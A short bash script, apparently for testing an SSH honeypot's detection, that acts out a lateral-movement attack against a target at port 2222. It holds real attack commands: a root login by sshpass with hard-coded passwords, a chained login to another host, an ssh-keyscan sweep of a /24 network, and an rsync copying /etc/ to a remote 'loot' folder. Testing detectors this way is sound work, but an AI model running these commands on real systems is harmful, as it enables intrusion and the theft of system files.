#!/usr/bin/env bash
# Lateral Movement Attack
# sshpass to other hosts, ssh-keyscan network discovery, rsync file spread.
#
# Usage:  scripts/attack-lateral-movement.sh [VM-IP]
# Default VM IP: 192.168.1.79
#
# Dashboard: http://<VM-IP>:5173
# What to look for: lateral_movement category, sshpass/ssh-keyscan in commands

set -euo pipefail
IP="${1:-192.168.1.79}"
echo ""
echo "==================================================================="
echo "  Lateral Movement Attack"
echo "==================================================================="
echo "  Target:    $IP:2222"
echo "  Category:  lateral_movement"
echo "==================================================================="
echo ""

sshpass -p "password" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o ConnectTimeout=10 \
  -p 2222 \
  root@$IP \
  "sshpass -p 'admin' ssh -o StrictHostKeyChecking=no root@192.168.1.1 'whoami' ; ssh-keyscan 192.168.1.0/24 2>/dev/null ; rsync -av /etc/ root@192.168.1.2:/tmp/loot/" 2>&1 || true

echo ""
echo "  ✓ Attack complete"
echo "  → Dashboard:  http://$IP:5173"
echo "  → API check:  curl -s http://$IP:5000/api/events?attack_category=lateral_movement&limit=3 | python3 -m json.tool"
echo ""
